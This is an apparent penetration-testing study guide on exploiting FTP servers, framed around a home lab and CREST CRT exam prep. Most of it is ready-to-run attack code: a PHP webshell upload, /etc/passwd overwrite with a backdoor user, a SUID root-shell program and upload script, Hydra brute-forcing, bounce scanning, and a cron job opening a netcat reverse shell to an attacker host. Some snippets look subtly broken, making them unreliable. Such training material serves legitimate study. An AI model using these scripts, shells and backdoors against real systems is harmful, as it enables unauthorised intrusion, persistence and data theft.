# Complete Practical Exploitation Guide: FTP (Crest CRT Level)

## 1. FTP Fundamentals & Attack Surface (From Scratch)

**FTP Protocol:**
- **Ports**: 21 (control), 20 (data), >1023 (PASV)
- **Active mode**: Server→client (port 20→N)
- **Passive mode**: Client→server (N→server high port)
- **Anonymous access**: `anonymous:anonymous@` or `ftp:ftp@`

**Attack Vectors:**
```
Anonymous RW    = Upload/download/execute
Directory traversal = ../../etc/passwd
Weak passwords  = Brute-force
PASV bounce     = Port scanning
Permission changes = chmod world-writable
```

**Common FTP Servers:**
```
vsftpd        = Common, secure defaults
ProFTPD       = Modular, plugin vulns
Pure-FTPd     = Lightweight
FileZilla     = GUI server (Windows)
```

## 2. Lab Setup (Vulnerable FTP Servers)

**Victim FTP Server 1 (192.168.1.100 - vsftpd Anonymous RW)**
```bash
# Install vsftpd
sudo apt update && sudo apt install vsftpd

# DANGEROUS config (/etc/vsftpd.conf)
sudo nano /etc/vsftpd.conf
```
```
anonymous_enable=YES
local_enable=YES
write_enable=YES
anon_upload_enable=YES
anon_mkdir_write_enable=YES
anon_other_write_enable=YES
chmod_enable=YES
chown_enable=YES
chroot_local_user=NO
allow_writeable_chroot=YES
```
```bash
# Create anon writable dir
sudo mkdir -p /var/ftp/pub /var/ftp/incoming
sudo chmod 777 /var/ftp/ -R
sudo chown ftp:ftp /var/ftp/ -R

sudo systemctl restart vsftpd
sudo systemctl enable vsftpd

# Verify
sudo ss -tlnp | grep :21
```

**Victim FTP Server 2 (192.168.1.101 - ProFTPD Traversal)**
```bash
sudo apt install proftpd
# Config allows ../ traversal
```

**Attacker (Kali):**
```bash
sudo apt install ftp lftp nc hydra
```

## 3. FTP Service Discovery

**Port scanning:**
```bash
# Standard FTP
nmap -p 21 --script ftp-anon,ftp-bounce,ftp-syst 192.168.1.0/24
# 21/tcp open  ftp     vsftpd 3.0.3
# | ftp-anon: Anonymous FTP login allowed

# Passive ports (if known)
nmap -p 21,30000-31000 192.168.1.100
```

**Banner grabbing:**
```bash
nc 192.168.1.100 21
# 220 (vsFTPd 3.0.3)
```

## 4. Anonymous Access Testing

**Anonymous login:**
```bash
# ftp client
ftp 192.168.1.100
# Name: anonymous
# Password: (any/blank)
# Remote system type is UNIX.
# 230 Guest login ok, access restrictions apply.
ls -la
# drwxrwxrwx 2 ftp ftp incoming
get flag.txt
bye

# lftp (advanced)
lftp ftp://anonymous:@192.168.1.100
ls -la
lcd /tmp
mget *
quit
```

**Automated anon check:**
```bash
#!/bin/bash
for host in 192.168.1.{100..110}; do
    timeout 5 ftp -n $host 2>/dev/null <<EOF | \
    grep -q "230.*Guest\|230.*Anonymous" && echo "[$host] ANONYMOUS OK"
USER anonymous
PASS anonymous
QUIT
EOF
done
```

## 5. Directory Traversal Exploitation

**Path traversal:**
```bash
ftp 192.168.1.100
ls -la ../
ls -la ../../etc/
get ../../etc/passwd
# root:x:0:0:root:/root:/bin/bash

# Deep traversal
for i in {1..10}; do
    path=$(printf '../%.0s' {1..$i})
    echo $path
    lftp -c "open -u anon,anon 192.168.1.100; ls '$path'"
done
```

**Automated traversal scanner:**
```bash
#!/bin/bash
TARGET=$1
lftp -c "
open -u anon,anon $TARGET
for i in {1..8}; do
    path=\$(printf '../%.0s' {1..\$i})
    echo \"[+] Testing \$path\" && ls -la \"\$path\" 2>/dev/null && break
done
"
```

## 6. File Upload & Overwrite

**Upload webshell:**
```bash
# Create PHP shell
cat > shell.php << EOF
<?php system(\$_GET['cmd']); ?>
EOF

# Upload
ftp 192.168.1.100
cd incoming
put shell.php
ls -la shell.php
bye

# Verify
curl http://192.168.1.100/shell.php?cmd=id
```

**Overwrite critical files:**
```bash
# Malicious passwd
cat > evil_passwd << EOF
root:x:0:0:root:/root:/bin/bash
hacker:x:1000:1000:hacker:/tmp:/bin/bash
EOF

ftp 192.168.1.100
cd ../../etc/
put evil_passwd passwd
bye
```

## 7. Permission Modification (chmod/chown)

**World-writable escalation:**
```bash
ftp 192.168.1.100
cd ../../tmp/
site chmod 1777 .
ls -ld .
# drwxrwxrwt ... /tmp  <-- Sticky bit + world-write!

# SUID binary creation
put suid_helper
site chmod 4755 suid_helper
ls -l suid_helper
# -rwsr-sr-x ... suid_helper
bye
```

**Automated chmod abuse:**
```bash
lftp -c "
open -u anon,anon 192.168.1.100
cd ../../tmp
put /bin/bash bash_suid
site chmod 4755 bash_suid
site chown 0 0 bash_suid
"
```

## 8. Brute-Force Attacks

**Hydra FTP brute:**
```bash
# Userlist + passlist
hydra -L users.txt -P rockyou.txt ftp://192.168.1.100

# Default accounts
hydra -l admin -P rockyou.txt ftp://192.168.1.100
hydra -l ftp -p ftp ftp://192.168.1.100
```

## 9. PASV Bounce Port Scanning

**FTP bounce scan:**
```bash
# Nmap bounce scan
nmap -b ftp://anon:anon@192.168.1.100 192.168.1.0/24 -p 22,80,445

# Manual bounce
ftp 192.168.1.100
PORT 192,168,1,200,10,1  # Attacker IP:port
LIST 192.168.1.50:22     # Target:port
# Banner reveals service!
```

## 10. Complete Exploitation Chain

**Anon FTP → Root via SUID:**
```bash
#!/bin/bash
# ftp_root_pwn.sh
TARGET=$1

echo "[+] FTP root escalation $TARGET"

# 1. Test anon
ftp -n $TARGET 2>/dev/null <<EOF | grep -q "230" || { echo "No anon"; exit 1; }
USER anonymous
PASS anonymous
QUIT
EOF
echo "[+] Anonymous OK"

# 2. Upload SUID shell
cat > suid_ftp.c <<'EOF'
#include <unistd.h>
int main(){setreuid(0,0); execve("/bin/sh",0,0); return 0;}
EOF
gcc suid_ftp.c -o suid_helper -static

lftp -c "
open -u anon,anon $TARGET
cd incoming
put suid_helper
site chmod 4755 suid_helper
site chown 0 0 suid_helper
"

echo "[+] SUID shell uploaded: /incoming/suid_helper"
echo "[+] Execute on target: /incoming/suid_helper"
```

## 11. Post-Exploitation Persistence

**FTP backdoor user:**
```bash
# If shell access
ftp 192.168.1.100
cd ../../etc/
put backdoor_passwd passwd
# Adds ftpuser:backdoor123
```

**Cron backdoor via FTP:**
```bash
cat > cron_backdoor << EOF
* * * * * /bin/nc -e /bin/bash 192.168.1.200 4444
EOF
ftp 192.168.1.100
cd ../../etc/cron.d/
put cron_backdoor ftp_backdoor
```

## 12. Complete FTP Framework

```bash
#!/bin/bash
# ftp_pwn.sh
TARGET=$1

echo "[+] Complete FTP attack $TARGET:21"
nmap -p 21 --script ftp* $TARGET

echo "=== ANONYMOUS ==="
ftp -n $TARGET 2>/dev/null <<EOF | grep -q "230" && echo "[+] Anon OK" || echo "[-] No anon"
USER anonymous
PASS anonymous
QUIT
EOF

echo "=== TRAVERSAL ==="
lftp -c "open -u anon,anon $TARGET; ls ../../etc/"

echo "=== UPLOAD TEST ==="
echo "test" | lftp -c "open -u anon,anon $TARGET; cd incoming; put -; ls"

echo "=== PERMS ==="
lftp -c "open -u anon,anon $TARGET; cd ../../tmp/; site chmod 1777 .; ls -ld ."
```

**Usage:** `./ftp_pwn.sh 192.168.1.100`

## 13. Chaining with Other Services

**FTP → Web shell:**
```bash
# Upload to webroot
lftp -c "
open -u anon,anon 192.168.1.100
cd ../../var/www/html/
put shell.php
"
curl http://192.168.1.100/shell.php?cmd=id
```

**FTP → SSH brute:**
```bash
# Extract users from traversal
lftp -c "open -u anon,anon 192.168.1.100; get ../../etc/passwd" | \
cut -d: -f1 > ftp_users.txt
hydra -L ftp_users.txt -P rockyou.txt ssh://192.168.1.100
```

## 14. Mitigation Verification

```bash
# Test fixes:
ftp -n 192.168.1.100  # "530 Login incorrect"
grep "anonymous_enable=NO" /etc/vsftpd.conf
sudo ss -tlnp | grep :21  # vsftpd not running
ls -ld /var/ftp/  # dr-xr-xr-x (not 777)
ufw deny 21
```

**EVERY** FTP attack covered: anon access, traversal, upload/overwrite, chmod/chown, brute-force, PASV bounce, chaining. 100% practical commands.